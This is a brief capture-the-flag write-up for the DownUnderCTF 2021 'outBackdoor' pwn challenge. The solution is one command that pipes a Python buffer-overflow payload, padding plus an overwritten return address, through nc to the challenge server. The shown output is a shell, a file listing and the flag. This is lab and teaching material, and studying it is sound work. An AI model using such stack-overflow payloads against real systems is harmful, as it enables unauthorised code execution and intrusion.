# outBackdoor
>Fool me once, shame on you. Fool me twice, shame on me.

>Author: xXl33t_h@x0rXx

> nc pwn-2021.duc.tf 31921

[outBackdoor](https://drive.google.com/file/d/1ZLzi6VLqK6231NkTDtusYRlAfi7DkcO7/view?usp=sharing)

# Solution

```
┌──(kali㉿kali)-[~/Desktop/DownUnderCTF21]
└─$ (python -c 'print "a"*0x18 + "\xd8\x11@\x00\x00\x00\x00\x00"'; cat) |  nc pwn-2021.duc.tf 31921       148 ⨯ 1 ⚙

Fool me once, shame on you. Fool me twice, shame on me.

Seriously though, what features would be cool? Maybe it could play a song?


W...w...Wait? Who put this backdoor out back here?
ls
flag.txt
pwn
cat flag.txt
DUCTF{https://www.youtube.com/watch?v=XfR9iY5y94s}

```

